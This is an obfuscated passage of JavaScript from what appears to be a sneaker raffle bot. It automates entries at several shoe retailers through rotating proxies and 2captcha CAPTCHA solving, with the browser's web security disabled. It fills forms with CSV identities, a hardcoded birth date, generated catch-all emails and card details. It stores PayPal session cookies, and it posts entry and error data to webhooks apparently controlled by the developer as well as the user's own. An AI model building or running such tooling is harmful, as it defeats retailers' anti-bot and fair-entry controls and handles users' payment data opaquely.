                console['log'](_0x5ecce5['yellow'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Task\x20' + (_0x2487cd + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x460eeb));
            }
        } catch (_0x1937f4) {
            console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Task\x20' + (_0x2487cd + 0x1) + '\x20:\x20' + _0x1937f4)), _0x5efe91 = '' + _0x1937f4;
            var _0x5882cf = await _0x3553d9(kickz[_0x2487cd], _0x144124, 'dev', !![], _0x5efe91);
            EMBEDS['errorDEV'] = { 'embeds': [_0x5882cf] }, _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], EMBEDS['errorDEV']), await _0x278fc0(_0x51b669, EMBEDS['errorDEV']), _0x4b20c9 = 'yes';
        } finally {
            _0x55e6a1 && _0x55e6a1['close']();
            if (_0x4b20c9 == 'yes' && _0x3aa948 != 0x5) {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x144124['name'] + ']\x20Task\x20' + (_0x2487cd + 0x1) + '\x20:\x20Retrying')), _0x2487cd = _0x2487cd - 0x1, _0x3aa948 = _0x3aa948 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x5690b2['delay'] + '\x20ms'), await _0x73378f(_0x5690b2['delay']);
        }
    }
}
async function _0x1e19cb(_0x35ac9e, _0x4a43d3, _0x4d72af) {
    var _0x152bbe = ![], _0x21a4ba = ![];
    if (_0x5690b2['captchaKey'] == '' || _0x5690b2['captchaKey'] == undefined)
        return console['log'](_0x5ecce5['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
    _0x4baac5['use'](_0x3f14b2()), _0x4baac5['use'](_0x318e48({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5690b2['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x528c43 = 0x0; _0x528c43 < _0x4a43d3['length']; _0x528c43++) {
        var _0x580934, _0x5581db = [{
            'type': 'rich',
            'title': 'Succesful\x20JD\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'Product',
                    'value': '' + _0x4a43d3[_0x528c43]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x4a43d3[_0x528c43]['Size']
                },
                {
                    'name': 'User',
                    'value': '' + _0x5746a9
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5690b2['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x2f0e91
                }
            ]
        }];
        const _0x40f1a4 = { 'embeds': _0x5581db };
        _0x992352(_0x35ac9e['name'] + '\x20Task\x20' + (_0x528c43 + 0x1) + '\x20/\x20' + _0x4a43d3['length'] + '\x20||\x20File:\x20' + _0x3dc3e8 + '\x20Proxies:\x20' + _0x261ffa), await _0x3e6cb2(_0x4a43d3, _0x528c43);
        var _0x506805 = await _0x3553d9(_0x4a43d3[_0x528c43], _0x35ac9e, 'dev', ![]), _0x593015 = await _0x3553d9(_0x4a43d3[_0x528c43], _0x35ac9e, 'pub', ![]);
        const _0x5e1d93 = {
            'succesDEVMSG': { 'embeds': [_0x506805] },
            'succesPUBMSG': { 'embeds': [_0x593015] }
        };
        if (_0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '')
            try {
                await _0x278fc0(_0x5690b2['webhook'], _0x5e1d93['succesDEVMSG']);
            } catch {
            }
        await _0x73378f(0xc8), await _0x278fc0(_0x4c279b, _0x5e1d93['succesDEVMSG']), await _0x73378f(0xc8);
        try {
            await _0x278fc0(_0x319480, _0x5e1d93['succesPUBMSG']);
        } catch {
        }
        if (_0x4a43d3[_0x528c43]['Email'] == '' || _0x4a43d3[_0x528c43]['Url'] == '' || _0x4a43d3[_0x528c43]['FirstName'] == '' || _0x4a43d3[_0x528c43]['LastName'] == '') {
            console['log'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Task\x20' + (_0x528c43 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x5690b2['useRandomProxy'] = ![])
            var _0x5b895c = _0x4d72af[_0x528c43]['split'](':');
        else
            var _0x27cea0 = Math['round'](Math['random']() * (_0x4d72af['length'] - 0x1)), _0x5b895c = _0x4d72af[_0x27cea0]['split'](':');
        const _0x14a851 = await _0x4baac5['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x5b895c[0x0] + ':' + _0x5b895c[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x196280 = await _0x14a851['newPage']();
            await _0x196280['authenticate']({
                'username': '' + _0x5b895c[0x2],
                'password': '' + _0x5b895c[0x3]
            }), console['log'](_0x18cf54() + '\x20[' + _0x35ac9e['name'] + ']\x20Task\x20' + (_0x528c43 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x196280['setRequestInterception'](!![]), _0x196280['on']('request', _0x1381f1 => {
                _0x1381f1['resourceType']() === 'image' || _0x1381f1['resourceType']() === 'font' || _0x1381f1['resourceType']() === 'media' ? _0x1381f1['abort']() : _0x1381f1['continue']();
            }), await _0x196280['goto']('' + _0x4a43d3[_0x528c43]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            });
            try {
                await _0x196280['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
            } catch {
                throw new Error('Not\x20an\x20Active\x20Raffle');
            }
            console['log'](_0x18cf54() + '\x20[' + _0x35ac9e['name'] + ']\x20Task\x20' + (_0x528c43 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x196280['type']('#comp_firstname', '' + _0x4a43d3[_0x528c43]['FirstName']), await _0x196280['waitForSelector']('#comp_lastname'), await _0x196280['type']('#comp_lastname', '' + _0x4a43d3[_0x528c43]['LastName']), await _0x196280['waitForSelector']('#comp_email'), await _0x196280['type']('#comp_email', '' + _0x4a43d3[_0x528c43]['Email']), await _0x196280['waitForSelector']('#comp_paypalemail'), await _0x196280['type']('#comp_paypalemail', '' + _0x4a43d3[_0x528c43]['Email']), await _0x196280['waitForSelector']('#comp_mobile_end'), await _0x196280['type']('#comp_mobile_end', '' + _0x4a43d3[_0x528c43]['Phone']), await _0x196280['waitForSelector']('#comp_dob'), await _0x196280['type']('#comp_dob', '08/09/1992'), console['log'](_0x18cf54() + '\x20[' + _0x35ac9e['name'] + ']\x20Task\x20' + (_0x528c43 + 0x1) + '\x20:\x20Choosing\x20Size');
            if (_0x4a43d3[_0x528c43]['Size'] == 'RANDOM') {
                const _0x59f481 = await _0x196280['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x593921 => {
                    return _0x593921['map'](_0x4d3df6 => _0x4d3df6['value']);
                });
                var _0xabe4b6 = Math['round'](Math['random']() * (_0x59f481['length'] - 0x2));
                await _0x196280['select']('#shoesize', _0x59f481[_0xabe4b6 + 0x1]), await _0x73378f(0x3e8);
            } else {
                const _0x2a0749 = await _0x196280['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x4b17cc => {
                    return _0x4b17cc['map'](_0x1ed50f => _0x1ed50f['innerText']);
                }), _0xa04962 = await _0x196280['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x468678 => {
                    return _0x468678['map'](_0x8b1f2f => _0x8b1f2f['value']);
                });
                var _0x4d4512 = _0x4a43d3[_0x528c43]['Size'];
                for (var _0x281368 = 0x1; _0x281368 < _0xa04962['length']; _0x281368++) {
                    var _0x5f1c72 = _0x2a0749[_0x281368]['split']('\x20')[0x0];
                    if (_0x5f1c72 == _0x4d4512) {
                        await _0x196280['select']('#shoesize', _0xa04962[_0x281368]);
                        break;
                    } else {
                        if (_0x281368 + 0x1 == _0xa04962['length'])
                            throw new Error('Size\x20Not\x20Found..');
                    }
                }
            }
            await _0x196280['waitForSelector']('#comp_address1'), await _0x196280['type']('#comp_address1', _0x4a43d3[_0x528c43]['Address1'] + '\x20' + _0x4a43d3[_0x528c43]['HouseNumber']), await _0x196280['waitForSelector']('#comp_address2'), await _0x196280['type']('#comp_address2', '' + _0x4a43d3[_0x528c43]['Address2']), await _0x196280['waitForSelector']('#comp_address2'), await _0x196280['type']('#comp_address3', '' + _0x4a43d3[_0x528c43]['City']), await _0x196280['waitForSelector']('#comp_postcode'), await _0x196280['type']('#comp_postcode', '' + _0x4a43d3[_0x528c43]['Zip']), console['log'](_0x18cf54() + '\x20[' + _0x35ac9e['name'] + ']\x20Task\x20' + (_0x528c43 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x73378f(0x4b0), await _0x196280['click']('label#emailhold'), await _0x73378f(0x5dc), await _0x196280['click']('#preauth_tandc_email\x20>\x20label'), await _0x73378f(0x5dc), await _0x196280['click']('#submit'), await _0x196280['waitForSelector']('#paymentWrap'), console['log'](_0x18cf54() + '\x20[' + _0x35ac9e['name'] + ']\x20Task\x20' + (_0x528c43 + 0x1) + '\x20:\x20' + _0x5ecce5['blue']('Awaiting\x20Paypal\x20Payment')), _0x14a851['on']('targetcreated', async _0x248551 => {
                if (_0x248551['type']() === 'page') {
                    const _0x188311 = await _0x248551['page']();
                    async function _0x55f23e() {
                        try {
                            await _0x196280['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x21a4ba = !![];
                            return;
                        } catch {
                        }
                    }
                    async function _0x387a7c() {
                        try {
                            await _0x196280['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x152bbe = !![];
                            return;
                        } catch {
                        }
                    }
                    _0x387a7c(), _0x55f23e(), await _0x73378f(0x493e0);
                }
            });
            async function _0x3a0903() {
                for (let _0xa7a346 = 0x0; _0xa7a346 < 0x12c; _0xa7a346++) {
                    if (_0x152bbe == !![]) {
                        console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x35ac9e['name'] + ']\x20Task\x20' + (_0x528c43 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '')
                            try {
                                await _0x278fc0(_0x5690b2['webhook'], _0x5e1d93['succesDEVMSG']);
                            } catch {
                            }
                        await _0x73378f(0xc8), await _0x278fc0(_0x4c279b, _0x5e1d93['succesDEVMSG']), await _0x73378f(0xc8);
                        try {
                            await _0x278fc0(_0x319480, _0x5e1d93['succesPUBMSG']);
                        } catch {
                        }
                        return;
                    } else {
                        if (_0x21a4ba)
                            throw new Error('Paypal\x20Error:\x20Target\x20closed');
                        else
                            await _0x73378f(0x3e8);
                    }
                }
                throw new Error('Paypal\x20Error');
            }
            await _0x73378f(0xbb8), await _0x196280['click']('.zoid-outlet'), await _0x73378f(0x7d0), await _0x3a0903();
        } catch (_0x59fe93) {
            console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x35ac9e['name'] + ']\x20Task\x20' + (_0x528c43 + 0x1) + '\x20:\x20' + _0x59fe93)), _0x580934 = '' + _0x59fe93;
            var _0x3099b6 = await _0x3553d9(_0x4a43d3[_0x528c43], _0x35ac9e, 'dev', !![], _0x580934);
            _0x5e1d93['errorDEV'] = { 'embeds': [_0x3099b6] }, _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x5e1d93['errorDEV']), await _0x278fc0(_0x51b669, _0x5e1d93['errorDEV']);
        } finally {
            _0x14a851 && _0x14a851['close'](), console['log']('Waiting\x20for\x20' + _0x5690b2['delay'] + '\x20ms'), await _0x73378f(_0x5690b2['delay']);
        }
    }
}
async function _0x563862(_0x37fcf3, _0x3d7a6f, _0x2de4aa) {
    _0x4baac5['use'](_0x3f14b2()), _0x4baac5['use'](_0x318e48({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5690b2['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0xf686c4 = 0x0; _0xf686c4 < _0x3d7a6f['length']; _0xf686c4++) {
        _0x992352(_0x37fcf3['name'] + '\x20Task\x20' + (_0xf686c4 + 0x1) + '\x20/\x20' + _0x3d7a6f['length'] + '\x20||\x20File:\x20' + _0x3dc3e8 + '\x20Proxies:\x20' + _0x261ffa);
        var _0x467250 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x5746a9
                },
                {
                    'name': 'Product',
                    'value': '' + _0x3d7a6f[_0xf686c4]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x3d7a6f[_0xf686c4]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5690b2['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x5690b2['version']
                }
            ]
        }];
        const _0x291d48 = { 'embeds': _0x467250 };
        await _0x3e6cb2(_0x3d7a6f, _0xf686c4);
        if (_0x3d7a6f[_0xf686c4]['Email'] == '' || _0x3d7a6f[_0xf686c4]['Password'] == '' || _0x3d7a6f[_0xf686c4]['FirstName'] == '' || _0x3d7a6f[_0xf686c4]['LastName'] == '') {
            console['log'](_0x18cf54() + '\x20[' + _0x37fcf3['name'] + ']\x20Task\x20' + (_0xf686c4 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x3d7a6f[_0xf686c4]['Password'] == '' || _0x3d7a6f[_0xf686c4]['Password'] == undefined) && (_0x3d7a6f[_0xf686c4]['Password'] = 'ErehsaWonRaj1!');
        if (_0x5690b2['useRandomProxy'] = ![])
            var _0x1891fe = _0x2de4aa[_0xf686c4]['split'](':');
        else
            var _0x3cd962 = Math['round'](Math['random']() * (_0x2de4aa['length'] - 0x1)), _0x1891fe = _0x2de4aa[_0x3cd962]['split'](':');
        const _0x3ae8d1 = await _0x4baac5['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x1891fe[0x0] + ':' + _0x1891fe[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x51ea50 = await _0x3ae8d1['newPage']();
            await _0x51ea50['authenticate']({
                'username': '' + _0x1891fe[0x2],
                'password': '' + _0x1891fe[0x3]
            }), console['log'](_0x18cf54() + '\x20[' + _0x37fcf3['name'] + ']\x20Task\x20' + (_0xf686c4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x51ea50['setRequestInterception'](!![]), _0x51ea50['on']('request', _0x1505f2 => {
                _0x1505f2['resourceType']() === 'image' || _0x1505f2['resourceType']() === 'font' || _0x1505f2['resourceType']() === 'media' ? _0x1505f2['abort']() : _0x1505f2['continue']();
            }), await _0x51ea50['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x51ea50['goto']('' + _0x3d7a6f[_0xf686c4]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x51ea50['waitForSelector']('#btnPdpAtb'), console['log'](_0x18cf54() + '\x20[' + _0x37fcf3['name'] + ']\x20Task\x20' + (_0xf686c4 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x3d7a6f[_0xf686c4]['Size']);
            const _0x5d9b16 = await _0x51ea50['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x312736 => {
                return _0x312736['map'](_0x38dd67 => _0x38dd67['innerText']);
            }), _0x3f6182 = await _0x51ea50['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x253d84 = ![];
            if (_0x3d7a6f[_0xf686c4]['Size'] == 'RANDOM') {
                var _0x559230 = Math['round'](Math['random']() * (_0x3f6182['length'] - 0x1));
                await _0x3f6182[_0x559230]['click']();
            } else
                for (var _0x5a5d8c = 0x0; _0x5a5d8c < _0x5d9b16['length']; _0x5a5d8c++) {
                    if (_0x5d9b16[_0x5a5d8c] != _0x3d7a6f[_0xf686c4]['Size'])
                        continue;
                    try {
                        await _0x3f6182[_0x5a5d8c]['click']();
                    } catch {
                        console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x37fcf3['name'] + ']\x20Task\x20' + (_0xf686c4 + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x253d84 = !![];
                    }
                }
            if (_0x253d84)
                continue;
            await _0x73378f(0x578), await _0x51ea50['click']('#btnPdpAtb'), await _0x51ea50['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x73378f(0x3e8), console['log'](_0x18cf54() + '\x20[' + _0x37fcf3['name'] + ']\x20Task\x20' + (_0xf686c4 + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x51ea50['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x51ea50['waitForSelector']('#email'), await _0x51ea50['type']('#email', _0x3d7a6f[_0xf686c4]['Email']), await _0x73378f(0x226), await _0x51ea50['click']('#guest-submit'), await _0x73378f(0x1b58), console['log'](_0x18cf54() + '\x20[' + _0x37fcf3['name'] + ']\x20Task\x20' + (_0xf686c4 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x51ea50['waitForSelector']('#firstname'), await _0x51ea50['type']('#firstname', _0x3d7a6f[_0xf686c4]['FirstName'], 0x1f4), await _0x73378f(0x190), await _0x51ea50['waitForSelector']('#surname'), await _0x51ea50['type']('#surname', _0x3d7a6f[_0xf686c4]['LastName'], 0x1f4), await _0x73378f(0x190), await _0x51ea50['waitForSelector']('#mobile'), await _0x51ea50['type']('#mobile', _0x3d7a6f[_0xf686c4]['Phone'], 0x1f4), await _0x73378f(0x190), await _0x51ea50['click']('#enterManualDiv'), await _0x73378f(0x5dc), await _0x51ea50['waitForSelector']('#address1'), await _0x51ea50['type']('#address1', _0x3d7a6f[_0xf686c4]['Address1'] + '\x20' + _0x3d7a6f[_0xf686c4]['HouseNumber'], 0x226), await _0x73378f(0x384), await _0x51ea50['waitForSelector']('#address2'), await _0x51ea50['type']('#address2', '' + _0x3d7a6f[_0xf686c4]['Address2'], 0x226), await _0x73378f(0x320);
            const _0x428251 = await _0x51ea50['$$eval']('#countryselect_view3\x20>\x20option', _0x31d090 => {
                return _0x31d090['map'](_0xf91cb6 => _0xf91cb6['value']);
            });
            var _0x20f264;
            for (var _0x4ee4a0 = 0x0; _0x4ee4a0 < _0x428251['length']; _0x4ee4a0++) {
                if (_0x428251[_0x4ee4a0]['startsWith']('' + _0x3d7a6f[_0xf686c4]['Country'])) {
                    _0x20f264 = _0x428251[_0x4ee4a0];
                    break;
                }
                continue;
            }
            await _0x51ea50['select']('#countryselect_view3', '' + _0x20f264), await _0x51ea50['waitForSelector']('#address4'), await _0x51ea50['type']('#address4', '' + _0x3d7a6f[_0xf686c4]['City'], 0x1f4), await _0x73378f(0x384), await _0x51ea50['waitForSelector']('#postcode'), await _0x51ea50['type']('#postcode', '' + _0x3d7a6f[_0xf686c4]['Zip'], 0x1f4), await _0x73378f(0x4b0);
            const _0x4f3d2f = await _0x51ea50['url']();
            console['log'](_0x18cf54() + '\x20[' + _0x37fcf3['name'] + ']\x20Task\x20' + (_0xf686c4 + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x5708d6 = _0x4f3d2f['split']('?')[0x1], _0x9a3986 = await _0x51ea50['$']('#co_address_submit');
            await _0x9a3986['evaluate'](_0x3c231b => _0x3c231b['click']()), await _0x73378f(0x1388), await _0x51ea50['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x5708d6), console['log'](_0x18cf54() + '\x20[' + _0x37fcf3['name'] + ']\x20Task\x20' + (_0xf686c4 + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x51ea50['waitForSelector']('#paymentbuttons'), await _0x73378f(0x1388), await _0x51ea50['click']('#paymentbuttons\x20>\x20div'), await _0x73378f(0x1c2), await _0x51ea50['waitForSelector']('#card-number'), await _0x51ea50['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x1383da = await _0x51ea50['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x51c314 = await _0x1383da['contentFrame']();
            await _0x51c314['waitForSelector']('.InputContainer'), await _0x51c314['click']('.InputContainer\x20>\x20input'), await _0x73378f(0x578), await _0x51ea50['type']('#card-number', '' + _0x3d7a6f[_0xf686c4]['CreditNumber']), await _0x73378f(0xfa), await _0x51ea50['type']('#card-expiry', '' + _0x3d7a6f[_0xf686c4]['ExpiryDate']), await _0x73378f(0xfa), await _0x51ea50['type']('#card-cvc', '' + _0x3d7a6f[_0xf686c4]['CVV']), await _0x73378f(0x7d0), await _0x51ea50['click']('#card-button'), console['log'](_0x18cf54() + '\x20[' + _0x37fcf3['name'] + ']\x20Task\x20' + (_0xf686c4 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x51ea50['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x37fcf3['name'] + ']\x20Task\x20' + (_0xf686c4 + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x278fc0(_0x4c279b, _0x291d48);
            } catch {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x37fcf3['name'] + ']\x20Task\x20' + (_0xf686c4 + 0x1) + '\x20:\x203DS\x20Failed')), _0x467250[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x467250[0x0]['description'] = '3DS\x20Failed', await _0x278fc0(_0x51b669, _0x291d48);
            }
        } catch (_0x241715) {
            console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x37fcf3['name'] + ']\x20Task\x20' + (_0xf686c4 + 0x1) + '\x20:\x20' + _0x241715)), _0x467250[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x467250[0x0]['description'] = '' + _0x241715, await _0x278fc0(_0x51b669, _0x291d48);
        } finally {
            _0x3ae8d1 && _0x3ae8d1['close']();
            if (_0xf686c4 + 0x1 == _0x3d7a6f['length']) {
                console['log'](_0x5ecce5['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x73378f(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x5690b2['AfewDelay'] + '\x20ms'), await _0x73378f(_0x5690b2['AfewDelay']);
        }
    }
}
async function _0x14f394(_0x210c76, _0x5e61c5, _0x7a7fae, _0x20e9a5, _0x3b5433) {
    var _0xe254c3, _0x43775a = {}, _0x1f692f = [], _0xb371de = {}, _0x5b215c = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x20e9a5 && (_0x20e9a5 = {});
    if (_0x5e61c5 != 'ver') {
        _0x992352(_0x7a7fae['name'] + '\x20Task\x20' + (_0x210c76 + 0x1) + '\x20/\x20' + _0x20e9a5['length'] + '\x20||\x20File:\x20' + _0x3dc3e8 + '\x20Proxies:\x20' + _0x261ffa), await _0x3e6cb2(_0x20e9a5, _0x210c76), _0x1f692f = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x5746a9
                },
                {
                    'name': 'Size',
                    'value': '' + _0x20e9a5[_0x210c76]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5690b2['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x2f0e91
                }
            ]
        }], _0xb371de = { 'embeds': _0x1f692f }, _0x43775a = _0x7a7fae['data'];
        _0x5e61c5 == 'exp' ? _0x43775a['data']['attributes']['email'] = '' + _0x20e9a5[_0x210c76]['FirstName'] + _0x20e9a5[_0x210c76]['LastName'] + _0x5690b2['catchall'] : _0x43775a['data']['attributes']['email'] = '' + _0x20e9a5[_0x210c76]['Email'];
        if (_0x20e9a5[_0x210c76]['Size'] == 'RANDOM') {
        }
        _0x43775a['data']['attributes']['properties']['$first_name'] = '' + _0x20e9a5[_0x210c76]['FirstName'], _0x43775a['data']['attributes']['properties']['$last_name'] = '' + _0x20e9a5[_0x210c76]['LastName'], _0x43775a['data']['attributes']['properties']['$address1'] = _0x20e9a5[_0x210c76]['Address1'] + '\x20' + _0x20e9a5[_0x210c76]['Address2'] + '\x20' + _0x20e9a5[_0x210c76]['HouseNumber'], _0x43775a['data']['attributes']['properties']['$zip'] = '' + _0x20e9a5[_0x210c76]['Zip'], _0x43775a['data']['attributes']['properties']['$city'] = '' + _0x20e9a5[_0x210c76]['City'], _0x43775a['data']['attributes']['properties']['$country'] = '' + _0x20e9a5[_0x210c76]['Country'], _0x43775a['data']['attributes']['properties']['Size'] = '' + _0x20e9a5[_0x210c76]['Size'], _0x43775a['data']['attributes']['properties']['$phone_number'] = '' + _0x20e9a5[_0x210c76]['Phone'], _0x43775a['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x20e9a5[_0x210c76]['Follower'];
    }
    if (_0x5690b2['useRandomProxy'] = ![])
        var _0x50346b = _0x3b5433[_0x210c76]['split'](':');
    else
        var _0x30fae4 = Math['round'](Math['random']() * (_0x3b5433['length'] - 0x1)), _0x50346b = _0x3b5433[_0x30fae4]['split'](':');
    var _0x5647fe = {
        'jar': _0x5d48fa,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x7a7fae['url'],
        'headers': _0x7a7fae['headers'],
        'body': JSON['stringify'](_0x43775a),
        'proxy': 'http://' + _0x50346b[0x2] + ':' + _0x50346b[0x3] + '@' + _0x50346b[0x0] + ':' + _0x50346b[0x1]
    };
    return _0x5e61c5 != 'ver' && (_0x5647fe['url'] = _0x7a7fae['url'], _0x5647fe['headers'] = _0x7a7fae['headers']), _0x5e61c5 == 'ver' && (_0x5647fe['method'] = 'GET'), new Promise(function (_0x350d23, _0x2f53d4) {
        callback = async (_0x143794, _0x3e30e3, _0x1d38f2) => {
            if (!_0x143794 && _0x3e30e3['statusCode'] == 0xca || !_0x143794 && _0x3e30e3['statusCode'] == 0xc8) {
                if (_0x5e61c5 != 'ver') {
                    var _0x2ad6cd = await _0x3553d9(_0x20e9a5[_0x210c76], _0x7a7fae, 'dev', ![]), _0x212fe6 = await _0x3553d9(_0x20e9a5[_0x210c76], _0x7a7fae, 'pub', ![]);
                    const _0xf21f7a = {
                        'succesDEVMSG': { 'embeds': [_0x2ad6cd] },
                        'succesPUBMSG': { 'embeds': [_0x212fe6] }
                    };
                    if (_0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '')
                        try {
                            await _0x278fc0(_0x5690b2['webhook'], _0xf21f7a['succesDEVMSG']);
                        } catch {
                        }
                    await _0x73378f(0xc8), await _0x278fc0(_0x4c279b, _0xf21f7a['succesDEVMSG']), await _0x73378f(0xc8);
                    try {
                        await _0x278fc0(_0x319480, _0xf21f7a['succesPUBMSG']);
                    } catch {
                    }
                }
                _0x350d23(console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x7a7fae['name'] + ']\x20Task\x20' + (_0x210c76 + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x5e61c5 != 'ver') {
                    var _0x4b65fc = '' + _0x143794, _0xb601a7 = await _0x3553d9(_0x20e9a5[_0x210c76], _0x7a7fae, 'dev', !![], _0x4b65fc), _0x5e6d1e = {};
                    _0x5e6d1e['errorDEV'] = { 'embeds': [_0xb601a7] }, _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x5e6d1e['errorDEV']), await _0x278fc0(_0x51b669, _0x5e6d1e['errorDEV']);
                }
                _0x2f53d4(console['log'](_0x18cf54() + '\x20[' + _0x7a7fae['name'] + ']\x20Task\x20' + (_0x210c76 + 0x1) + ':\x20' + _0x143794));
            }
        };
        try {
            _0x5e61c5 != 'ver' && console['log'](_0x18cf54() + '\x20[' + _0x7a7fae['name'] + ']\x20Task\x20' + (_0x210c76 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x43775a['data']['attributes']['email']), _0x262614(_0x5647fe, callback);
        } catch (_0x1e3ea2) {
            console['log'](_0x18cf54() + '\x20Task\x20' + (_0x210c76 + 0x1) + ':\x20' + _0x1e3ea2);
        }
    });
}
;
async function _0x409f21(_0x5e0847, _0x5a7330, _0x1dca31) {
    var _0x4fd990;
    _0x992352('' + _0x5a7330);
    var _0x44b2f8 = _0x1dca31[0x0]['split'](':');
    const _0x20e2cc = await _0x4baac5['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0x44b2f8[0x0] + ':' + _0x44b2f8[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0x18cf54() + '\x20[' + _0x5a7330 + ']\x20Getting\x20Session');
        const _0x2e35c1 = JSON['parse'](_0x536860['readFileSync']('sessions/log.json')), _0x59d595 = await _0x20e2cc['newPage']();
        await _0x59d595['authenticate']({
            'username': '' + _0x44b2f8[0x2],
            'password': '' + _0x44b2f8[0x3]
        }), await _0x59d595['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x59d595, await _0x59d595['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x18cf54() + '\x20[' + _0x5a7330 + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x59d595['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x18cf54() + '\x20[' + _0x5a7330 + ']\x20Successfully\x20logged\x20in'), await _0x73378f(0x2710), _0x4fd990 = await _0x59d595['cookies'](), _0x536860['writeFileSync']('sessions/log.json', '' + JSON['stringify'](_0x4fd990));
        } catch (_0x28b39a) {
